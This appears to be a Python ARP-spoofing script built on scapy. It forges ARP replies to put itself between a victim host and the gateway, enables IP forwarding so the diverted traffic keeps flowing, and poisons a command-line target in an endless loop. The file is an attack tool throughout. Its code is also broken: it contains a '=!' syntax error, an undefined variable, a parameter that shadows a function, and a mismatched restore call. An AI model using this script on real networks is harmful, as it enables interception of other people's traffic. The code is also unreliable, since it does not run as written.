from time import sleep
from sys import argv
from subprocess import call

from scapy.all import send, ARP

from Target import Target
from scan_arp import make_target
from utils import get_gateway

sleep_iter = 3

def partial_poison(Victim):
    op_code = 1
    pass_traffic(True)
    send(ARP(op = op_code, psrc=Victim.ipv4, hwdst=Victim.mac))
    sleep(sleep_iter)

def full_poison(Victim, Gateway):
    op_code = 2
    send(ARP(op = op_code, pdst = Victim.ipv4, psrc = Gateway.ipv4, hwdst = Victim.mac))
    send(ARP(op = op_code, pdst = Gateway.ipv4, psrc = Victim.ipv4, hwdst = Gateway.mac))
    sleep(sleep_iter)

def restore(Victim, Gateway):
    op_code = 2
    mac_addr = "ff:ff:ff:ff:ff:ff"

    send(ARP(op = op_code, pdst = Gateway.ipv4, psrc = Victim.ipv4, hwdst = mac_addr, hwsrc = Victim.mac), count = 4)
    send(ARP(op = op_code, pdst = Victim.ipv4, psrc = Gateway.ipv4, hwdst = mac_addr, hwsrc = Gateway.mac), count = 4)
    pass_traffic(False)

def spoof_all(victim_list, full_poison = False):
    Gateway = make_target(get_gateway())

    try:
        pass_traffic(True)
        if full_poison == True:
            while 1: [full_poison(Victim, Gateway)for Victim in victim_list]
        else: [partial_poison(poison) for Victim in victim_list]

    except KeyboardInterrupt:
        restore(victim_list, Gateway)
    except Exception as E:
        print(E)
        pass_traffic(False)
    return

def pass_traffic(confirm=True):
    cmd = 'sysctl -w net.inet.ip.forwarding='

    if confirm =! True: cmd = cmd + '0'
    else: cmd = cmd + '1'

    call(cmd)#, shell=True)

    return 

if __name__ == '__main__':
    #pass in the ip_address of the target you wish to poison 
    Victim = make_target(argv[1])
    while 1:
        partial_poison(Victim) 

'''
    Gateway = make_target(get_gateway())
    try:
        while 1:
            spoof(Victim, Gateway)
            sleep(1)
    except KeyboardInterrupt:
        restore(Victim, Gateway)
    except Exception as e:
        print(e)
        restore(Victim, Gateway)
'''
